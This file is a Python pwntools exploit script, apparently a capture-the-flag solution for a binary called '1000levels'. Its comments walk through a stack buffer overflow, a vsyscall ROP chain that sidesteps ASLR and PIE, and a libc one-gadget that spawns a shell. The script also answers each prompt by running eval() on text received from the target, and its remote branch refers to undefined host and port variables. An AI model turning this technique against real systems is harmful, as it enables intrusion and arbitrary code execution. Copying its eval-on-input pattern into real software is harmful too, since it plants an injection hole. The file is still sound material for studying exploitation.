#!/usr/bin/python
from pwn import *
import sys

system_offset = 0x0000000000045390 			# Address of system in our libc.so.6
ret_address = 0xffffffffff600400 			# Return address that we want to use for ROP Chain
target_offset = 0x4526a 				# The magic Libc gadget that will grant us shell

difference = target_offset - system_offset		# Since the second prompt will subtract the first variable 
					   		# (the one used to contain the address of system@got)
							# with it, we can give it a negative value so it will
							# add the variable instead, therefore accessing the target offset.

def answer (equation):
	parse = equation [9:equation.find ("=")]	# Getting the equations
	solve = eval (parse) 				# Automated solving
	return solve 					# Return solved answer

def exploit (r):
	r.sendline ("2")
	r.clean ()
	r.sendline ("1")
	r.clean ()
	r.sendline ("0")
	r.clean ()
	r.sendline (str (difference))

	for i in range (999):
		r.recvline_contains ("Level")
		equation = r.clean ()
		solve = answer (equation)
		r.send (str (solve) + "\x00")			# Give the answers with a null terminator

		if i % 50 == 0:
			log.info ("Please wait... %d/1000" % i)

	payload = str (solve) + "\x00"			# Our last answer.

	payload = payload.ljust (56, "B")		# Padded by 56 B's from the left to overflow the buffer and allowing
							# us to ROP Chain.

	payload += p64 (ret_address) * 3 		# Our ROP Chain gadgets obtained from the offset of vsyscall.
							# Note that the gadgets from vsyscall is not affected by ASLR or PIE
							# because it creates its own virtual memory at runtime.

	log.info ("Injected our vsyscall ROPs")

	r.send (payload)
	r.clean ()

	r.success ("Shell spawned! Enjoy!")
	r.interactive()

if __name__ == "__main__":
	e = ELF ('./1000levels')
	libc = ELF ('./libc.so.6', checksec = False)

	if len (sys.argv) > 1:
		r = remote (host, port)
		exploit (r)
		r.close ()
	else:
		r = process ('./1000levels', env = {'LD_PRELOAD' : './libc.so.6'})
		exploit (r)
		r.close ()
